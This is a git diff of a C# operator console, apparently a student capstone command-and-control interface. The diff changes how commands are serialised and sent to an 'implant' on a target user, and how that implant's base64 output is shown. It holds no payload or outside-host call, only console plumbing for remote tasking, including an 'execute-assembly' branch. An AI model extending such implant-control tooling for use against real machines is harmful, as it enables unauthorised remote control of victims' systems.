@@ -37,6 +37,7 @@ namespace CapstoneInterface
             public string timeToExec { get; set; }
             public string delay { get; set; }
             public string File { get; set; }
+            public string command { get; set; }
         }
         public class User
         {
@@ -121,15 +122,16 @@ namespace CapstoneInterface
                     // Append the user command to the console output
                     txtConsoleOutput.AppendText(userCommand + "\r\n");
 
-                    commandForImplant.Input = command;
+                    commandForImplant.Input = instruction;
                     commandForImplant.ImplantUser = userToControl;
                     commandForImplant.Operator = operatorName;
                     commandForImplant.timeToExec = "0";
                     commandForImplant.delay = "0";
+                    commandForImplant.command = command;
 
                     dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);
 
-                    sendJSONInstruction(jsonCommand);
+                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                 }
 
                 else if (input.Contains("execute-assembly")) {
@@ -153,12 +155,12 @@ namespace CapstoneInterface
 
                     dynamic jsonCommand = JsonConvert.SerializeObject(commandForImplant);
 
-                    sendJSONInstruction(jsonCommand);
+                    sendJSONInstruction(jsonCommand, commandForImplant.ImplantUser);
                 }
             }
         }
 
-        public async void sendJSONInstruction(dynamic jsonCommand)
+        public async void sendJSONInstruction(dynamic jsonCommand, dynamic user)
         {
             HttpClient client = new HttpClient();
             var content = new StringContent(jsonCommand, Encoding.UTF8, "application/json");
@@ -177,8 +179,9 @@ namespace CapstoneInterface
 
                 string outputBase64 = outputObj.Output;
                 string output = Encoding.UTF8.GetString(Convert.FromBase64String(outputBase64));
-
-                txtConsoleOutput.AppendText("\r\n" + output);
+                txtConsoleOutput.AppendText("\r\n\r\n" + "Receiving " + output.Length + " bytes from " + user);
+                await Task.Delay(2000);
+                txtConsoleOutput.AppendText("\r\n\r\n" + output);
             }
             else
             {
